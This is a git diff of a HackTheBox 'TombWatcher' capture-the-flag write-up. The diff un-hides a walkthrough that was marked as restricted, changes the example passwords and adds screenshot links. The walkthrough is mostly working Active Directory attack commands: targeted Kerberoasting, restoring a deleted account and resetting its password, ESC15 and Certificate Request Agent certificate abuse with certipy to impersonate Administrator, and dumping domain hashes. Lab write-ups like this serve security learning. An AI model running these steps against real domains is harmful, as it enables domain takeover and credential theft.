@@ -67,9 +67,6 @@ python targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'
 ```
 Crack Hash: Crack the dumped hash using John the Ripper with a wordlist.
 
-**Access Restricted by HackTheBox Rules**
-
-<!--
 
 Bash
 
@@ -185,8 +182,10 @@ PowerShell
 Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
 Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
 Enable-ADAccount -Identity cert_admin
-Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "jhvc@4569@" -AsPlainText -Force)
+Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "z0nHere" -AsPlainText -Force)
 ```
+
+![Restore](Pictures/htb_tombwatcher_All.jpg)
 
 Then, confirm the password change for cert_admin using bloodyAD.
 
@@ -195,7 +194,7 @@ Bash
 ```
 
 bloodyAD --host '10.10.11.72' -d tombwatcher.htb \
-  -u john -p 'jhvc@4569@' set password cert_admin 'jhvc@4569@'
+  -u john -p 'z0nHere' set password cert_admin 'z0nHere'
 
 ```
 The cert_admin account is now controlled.
@@ -205,7 +204,7 @@ Cert Enumeration: Use certipy to enumerate the Certificate Authority (CA) and av
 
 Bash
 ```
-certipy find -u cert_admin -p "jhvc@4569@" -dc-ip 10.10.11.72 -vulnerable
+certipy find -u cert_admin -p "z0nHere" -dc-ip 10.10.11.72 -vulnerable
 ```
 This reveals the WebServer template with "Enrollee supplies subject: True" and an "ESC15 vulnerability detected".
 
@@ -214,7 +213,7 @@ This reveals the WebServer template with "Enrollee supplies subject: True" and a
 Bash
 ```
 certipy req \
-  -u 'cert_admin@tombwatcher.htb' -p 'jhvc@4569@' \
+  -u 'cert_admin@tombwatcher.htb' -p 'z0nHere' \
   -dc-ip '10.10.11.72' \
   -ca 'tombwatcher-CA-1' \
   -template 'WebServer' \
@@ -229,6 +228,9 @@ Bash
 ```
 certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
 ```
+
+![Admin_Pass_change](Pictures/htb_tombwatcher_Admin_passchange.jpg)
+
 From here, the Administrator's password can be changed, leading to full Domain Administrator access.
 
 **Plan B (Certificate Request Agent Attack - Alternative): If Plan A is not feasible, obtain an Agent certificate.**
@@ -236,7 +238,7 @@ From here, the Administrator's password can be changed, leading to full Domain A
 Bash
 ```
 certipy req \
-  -u 'cert_admin@tombwatcher.htb' -p 'jhvc@4569@' \
+  -u 'cert_admin@tombwatcher.htb' -p 'z0nHere' \
   -dc-ip '10.10.11.72' -ca 'tombwatcher-CA-1' \
   -template 'WebServer' \
   -application-policies 'Certificate Request Agent'
@@ -246,7 +248,7 @@ Then, impersonate the Administrator by requesting a user certificate on their be
 Bash
 ```
 certipy req \
-  -u 'cert_admin@tombwatcher.htb' -p 'jhvc@4569@' \
+  -u 'cert_admin@tombwatcher.htb' -p 'z0nHere' \
   -dc-ip '10.10.11.72' -ca 'tombwatcher-CA-1' \
   -template 'User' \
   -pfx cert_admin.pfx \
@@ -259,7 +261,7 @@ Bash
 certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
 ```
 
-
+![Admin_hash](Pictures/htb_tombwatcher_Admin_hash.jpg)
 
 **Method 2**
 
@@ -299,10 +301,9 @@ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
 
 From this privileged position, I could add john to the Domain Admins group, dump all domain hashes by retrieving the NTDS.dit file, and access the administrator's profile to retrieve the root.txt flag, successfully rooting the machine.
 
-![Root_Flag](Pictures/htb_tombwatcher_Root_flag.png)
+![Root_Flag](Pictures/htb_tombwatcher_Root_Flag.jpg)
 
 
--->
 
 **Pwned! Tombwatcher**
 
